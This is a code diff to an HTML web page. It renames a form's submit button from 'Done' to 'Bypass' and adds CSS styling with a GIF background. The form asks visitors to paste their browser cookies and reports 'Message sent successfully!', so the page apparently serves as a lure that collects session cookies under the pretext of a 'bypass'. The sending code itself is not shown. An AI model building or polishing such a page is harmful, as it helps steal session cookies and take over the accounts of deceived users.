@@ -58,7 +58,7 @@
                 <label for="textInput" class="form-label">Paste Cookies Here</label>
                 <textarea class="form-control" id="textInput" rows="5" placeholder="" required></textarea>
             </div>
-            <button type="submit" class="btn btn-primary w-100">Done</button>
+            <button type="submit" class="btn btn-primary w-100">Bypass</button>
         </form>
         <div id="successAlert" class="alert alert-success mt-3">Message sent successfully!</div>
         <div id="errorAlert" class="alert alert-danger mt-3">Failed to send message. Please try again.</div>
@@ -99,3 +99,29 @@
     </script>
 </body>
 </html>
+<style>
+    body {
+        background: url('https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif') no-repeat center center fixed;
+        background-size: cover;
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+        color: white;
+    }
+
+    .container {
+        max-width: 600px;
+        margin-top: 50px;
+        background: rgba(0, 0, 0, 0.6); /* Semi-transparent background for readability */
+        padding: 30px;
+        border-radius: 10px;
+    }
+
+    .alert {
+        display: none;
+    }
+
+    label, h1 {
+        color: #ffffff;
+    }
+</style>
